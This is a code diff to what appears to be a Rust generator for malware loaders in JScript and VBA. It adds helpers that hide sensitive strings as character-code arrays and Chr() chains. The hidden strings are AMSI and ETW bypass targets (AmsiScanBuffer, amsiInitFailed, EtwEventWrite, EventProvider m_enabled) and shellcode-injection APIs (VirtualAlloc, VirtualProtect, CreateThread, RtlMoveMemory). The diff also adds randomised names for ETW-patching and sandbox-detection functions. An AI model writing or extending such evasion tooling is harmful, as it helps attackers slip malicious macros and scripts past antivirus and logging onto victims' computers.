@@ -133,6 +133,14 @@ pub struct AppDomainTemplateConfig {
     pub appdomain_name: String,
 }
 
+fn to_charcode_jscript(s: &str) -> String {
+    s.bytes().map(|b| b.to_string()).collect::<Vec<_>>().join(",")
+}
+
+fn to_charcode_vba(s: &str) -> String {
+    s.bytes().map(|b| format!("Chr({})", b)).collect::<Vec<_>>().join(" & ")
+}
+
 fn rand_ident(len: usize) -> String {
     let mut rng = rand::thread_rng();
     let first: char = rng.gen_range(b'a'..=b'z') as char;
@@ -226,6 +234,45 @@ fn build_context(config: &LoaderConfig) -> Context {
         "dotnet_stub_hex",
         "4d5a90000300000004000000ffff0000".to_string(),
     );
+
+    // New function idents for ETW/sandbox
+    for k in &["fn_etw", "fn_etw_patch", "fn_sandbox", "fn_build_str"] {
+        vars.insert(k, rand_ident(10));
+    }
+
+    // JScript charcode arrays (comma-separated integers) for sensitive strings
+    let jsc_pairs: &[(&str, &str)] = &[
+        ("jsc_amsi_scan_buf",     "AmsiScanBuffer"),
+        ("jsc_amsi_init_fail",    "amsiInitFailed"),
+        ("jsc_auto_amsi_utils",   "System.Management.Automation.AmsiUtils"),
+        ("jsc_etw_event_write",   "EtwEventWrite"),
+        ("jsc_eventing_ep",       "System.Diagnostics.Eventing.EventProvider"),
+        ("jsc_m_enabled",         "m_enabled"),
+        ("jsc_kernel32",          "kernel32"),
+        ("jsc_amsi_dll",          "amsi.dll"),
+        ("jsc_ntdll_dll",         "ntdll.dll"),
+        ("jsc_virtual_alloc",     "VirtualAlloc"),
+        ("jsc_create_thread",     "CreateThread"),
+    ];
+    for &(k, s) in jsc_pairs {
+        vars.insert(k, to_charcode_jscript(s));
+    }
+
+    // VBA Chr() concatenation for sensitive strings
+    let vba_pairs: &[(&str, &str)] = &[
+        ("vba_amsi_scan_buf",   "AmsiScanBuffer"),
+        ("vba_etw_event_write", "EtwEventWrite"),
+        ("vba_kernel32",        "kernel32"),
+        ("vba_amsi_dll",        "amsi.dll"),
+        ("vba_ntdll_dll",       "ntdll.dll"),
+        ("vba_user32_dll",      "user32"),
+        ("vba_virtual_alloc",   "VirtualAlloc"),
+        ("vba_virtual_protect", "VirtualProtect"),
+        ("vba_rtl_move_mem",    "RtlMoveMemory"),
+    ];
+    for &(k, s) in vba_pairs {
+        vars.insert(k, to_charcode_vba(s));
+    }
 
     ctx.insert("v", &vars);
 
